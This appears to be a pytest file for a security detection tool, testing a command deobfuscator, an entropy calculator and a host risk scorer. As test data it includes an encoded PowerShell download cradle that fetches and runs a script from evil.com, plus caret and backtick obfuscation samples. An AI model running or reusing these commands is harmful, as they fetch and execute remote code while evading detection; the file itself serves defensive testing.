"""Unit tests for Deobfuscation, Shannon Entropy, and Entity Risk Scorer."""

import pytest
from src.evaluator.deobfuscator import CommandDeobfuscator
from src.evaluator.entropy import ShannonEntropyCalculator
from src.correlation.risk_scorer import EntityRiskScorer


def test_command_deobfuscation():
    # 1. Base64 UTF-16LE encoded PowerShell download string
    # "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')" in base64 UTF-16LE:
    b64_cmd = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA="
    res = CommandDeobfuscator.deobfuscate(b64_cmd)
    assert res["is_obfuscated"] is True
    assert "DownloadString" in res["decoded_payload"]
    assert "Net.WebClient" in res["decoded_payload"]
    assert "Base64/UTF-16LE Payload Encoding" in res["evasion_techniques"]

    # 2. Caret insertion evasion
    caret_cmd = "c^m^d.e^x^e /c p^o^w^e^r^s^h^e^l^l.exe"
    res_caret = CommandDeobfuscator.deobfuscate(caret_cmd)
    assert res_caret["is_obfuscated"] is True
    assert res_caret["normalized"] == "cmd.exe /c powershell.exe"

    # 3. Backtick evasion
    backtick_cmd = "powershell.exe `d`o`w`n`l`o`a`d`s`t`r`i`n`g"
    res_backtick = CommandDeobfuscator.deobfuscate(backtick_cmd)
    assert res_backtick["is_obfuscated"] is True
    assert res_backtick["normalized"] == "powershell.exe downloadstring"


def test_shannon_entropy_calculator():
    # Plain simple English command line -> Low entropy (< 3.5)
    plain_cmd = "notepad.exe notes.txt"
    ent_plain = ShannonEntropyCalculator.calculate_entropy(plain_cmd)
    assert ent_plain < 3.8

    # Cryptic / Encrypted Base64 string -> High entropy (> 4.0)
    random_blob = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA"
    ent_blob = ShannonEntropyCalculator.calculate_entropy(random_blob)
    assert ent_blob > 4.0

    analysis = ShannonEntropyCalculator.analyze_tokens(f"powershell.exe -enc {random_blob}", threshold=4.0)
    assert analysis["is_anomaly"] is True


def test_entity_risk_scorer():
    scorer = EntityRiskScorer(breach_threshold=70)

    # Event 1: Reconnaissance (+15 pts) -> 15/100
    alert1 = scorer.record_detection("HOST-CORP-01", "DET-PROC-008", "Whoami Recon", 7, "2026-08-14T20:00:00Z")
    assert alert1 is None
    assert scorer.get_host_score("HOST-CORP-01") == 15

    # Event 2: Office spawns CMD (+15 pts) -> 30/100
    alert2 = scorer.record_detection("HOST-CORP-01", "DET-PROC-002", "Office spawns CMD", 7, "2026-08-14T20:01:00Z")
    assert alert2 is None
    assert scorer.get_host_score("HOST-CORP-01") == 30

    # Event 3: Deobfuscated Download Cradle (+50 pts) -> 80/100 -> Crosses 70 threshold!
    alert3 = scorer.record_detection("HOST-CORP-01", "DET-PROC-012", "C2 Download Cradle", 13, "2026-08-14T20:02:00Z")
    assert alert3 is not None
    assert "CORR-RISK-001" in alert3.rule_id
    assert scorer.get_host_score("HOST-CORP-01") == 80
    assert alert3.active_response["action"] == "ISOLATE_HOST"
